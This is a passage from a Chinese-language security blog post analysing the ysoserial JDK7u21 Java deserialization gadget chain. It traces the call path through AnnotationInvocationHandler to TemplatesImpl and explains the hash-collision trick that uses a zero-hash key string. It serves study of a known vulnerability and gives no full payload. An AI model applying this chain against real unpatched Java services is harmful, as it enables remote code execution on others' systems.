<p>可简化为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LinkHashSet.readObject()	</span><br><span class="line">	HashSet.readObject()			</span><br><span class="line">		HashMap.put()</span><br><span class="line">          TemplatesImpl.equals()</span><br><span class="line">              AnnotationInvocationHandler.invoke()</span><br><span class="line">              AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">              	Method.invoke()</span><br><span class="line">                	TemplatesImpl.getOutputProperties()</span><br><span class="line">                              ...</span><br></pre></td></tr></table></figure></p>
<h3 id="hash绕过"><a href="#hash绕过" class="headerlink" title="hash绕过"></a>hash绕过</h3><p>在<code>java.util.HashMap.put()</code>中有个重要判断:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k)))</span><br></pre></td></tr></table></figure></p>
<p>根据Java<strong>短路求值</strong>,如果需要触发<code>key.equals(k)</code>,就必须满足：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.hash == hash       true</span><br><span class="line">(k = e.key) == key   false</span><br></pre></td></tr></table></figure></p>
<p>当调用<code>put(proxy)</code>时,map中已经有<code>Templates</code>对象,所以这里的<code>e.hash</code>就为<code>Templates.hash</code>,则需要满足的条件变成了<code>proxy.hash == Templates.hash</code>            </p>
<p>需要满足条件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxy.hashcode() == templates.hashcode()</span><br><span class="line">proxy != templates</span><br></pre></td></tr></table></figure></p>
<p>第二条很容易满足(一个为代理类,一个是Templates实例),我们分析<strong>第一条</strong>:<br>调用<code>templates.hashcode()</code>时，由于<code>Templates</code>没有重写<code>hashcode()</code>,所以照常返回hash值<br>而调用<code>proxy.hashcode()</code>时,会转发到<code>AnnotationInvocationHandler.invoke()</code>,且<code>invoke()</code>中对<code>hashCode()</code>进行了实现:        </p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-09.16.57.22-image.png" alt="2019-06-09.16.57.22-image.png"></p>
<p>跟进<code>hashCodeImpl()</code>:            </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">private int hashCodeImpl() &#123;</span><br><span class="line">        int var1 = 0;</span><br><span class="line"></span><br><span class="line">        Entry var3;</span><br><span class="line">        for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;</span><br><span class="line">            var3 = (Entry)var2.next();</span><br><span class="line">        &#125;</span><br><span class="line">        return var1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>跟进<code>memberValueHashCode()</code>:            </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private static int memberValueHashCode(Object var0) &#123;</span><br><span class="line">        Class var1 = var0.getClass();</span><br><span class="line">        if (!var1.isArray()) &#123;		//满足</span><br><span class="line">            return var0.hashCode();</span><br></pre></td></tr></table></figure>
<p>当传入对象var0不为数组时,返回<code>var0.hashCode()</code><br>所以当我们传入<code>memberValues</code>值为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map.put(&quot;f5a5a608&quot;, templates);   //&quot;f5a5a608&quot;.hashCode() = 0</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-10.11.48.48-image.png" alt="2019-06-10.11.48.48-image.png"></p>
<p>最后执行结果为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var1 += 127 * &quot;f5a5a608&quot;.hashCode() ^ templates.hashCode()</span><br><span class="line">==</span><br><span class="line">var1 += 0 ^ templates.hashCode()</span><br><span class="line">==</span><br><span class="line">var1 += templates.hashCode()</span><br></pre></td></tr></table></figure></p>
<p>最后<code>proxy.hashCode()</code>返回结果为<code>templates.hashcode()</code></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-06-09.20.54.26-image.png" alt="2019-06-09.20.54.26-image.png"></p>
<p>这两个条件都满足的话就会调用<code>key.equals(k)</code>            </p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>JDK7u21这个payload主要用到<strong>TemplatesImpl</strong>与<strong>AnnocationInvocationHandler</strong>这两个类,此外还用到hash碰撞的小技巧。发现者真心牛逼，膜拜。后续修复分析与JDK8u20一并发出</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/u011721501/article/details/78607633" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/78607633</a>        </p>
<p><a href="https://lightless.me/archives/java-unserialization-jdk7u21.html" target="_blank" rel="noopener">https://lightless.me/archives/java-unserialization-jdk7u21.html</a></p>
<p><a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/" target="_blank" rel="noopener">https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/</a>                </p>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="../../../../index.html">Home</a></li>
         
          <li><a href="../../../../about.html">About</a></li>
         
          <li><a href="../../../../archives/">Writing</a></li>
         
          <li><a href="../../../../friends.html">Friends</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JDK7u21-payload分析"><span class="toc-number">1.</span> <span class="toc-text">JDK7u21 payload分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#javassist"><span class="toc-number">1.1.</span> <span class="toc-text">javassist</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#动态代理"><span class="toc-number">1.2.</span> <span class="toc-text">动态代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC核心类"><span class="toc-number">1.3.</span> <span class="toc-text">POC核心类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl利用"><span class="toc-number">1.3.1.</span> <span class="toc-text">TemplatesImpl利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AnnotationInvocationHandler"><span class="toc-number">1.3.2.</span> <span class="toc-text">AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LinkedHashSet"><span class="toc-number">1.3.3.</span> <span class="toc-text">LinkedHashSet</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hash绕过"><span class="toc-number">1.4.1.</span> <span class="toc-text">hash绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">1.5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">1.6.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/&text=Ysoserial之JDK7u21分析"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/&title=Ysoserial之JDK7u21分析"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/&is_video=false&description=Ysoserial之JDK7u21分析"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Ysoserial之JDK7u21分析&body=Check out this article: https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/&title=Ysoserial之JDK7u21分析"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/&title=Ysoserial之JDK7u21分析"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/&title=Ysoserial之JDK7u21分析"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/&title=Ysoserial之JDK7u21分析"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://p0rz9.github.io/2019/06/08/Ysoserial之JDK7u21分析/&name=Ysoserial之JDK7u21分析&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> 目录</a></li>
        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> 顶部</a></li>
        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> 菜单</a></li>
      </ul>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    版权所有 &copy; 2019 P0rZ9
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about.html">About</a></li><li><a href="../../../../archives/">Writing</a></li><li><a href="../../../../friends.html">Friends</a></li>
      </ul>
    </nav>
  </div>
</footer>



</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="../../../../lib/font-awesome/css/font-awesome.min.css">
<link rel="stylesheet" href="../../../../lib/meslo-LG/styles.css">
<link rel="stylesheet" href="../../../../lib/justified-gallery/justifiedGallery.min.css">


<!-- jquery -->
<script src="../../../../lib/jquery/jquery.min.js"></script>
<script src="../../../../lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
<script src="../../../../js/main.js"></script>
<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-86660611-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Disqus Comments -->


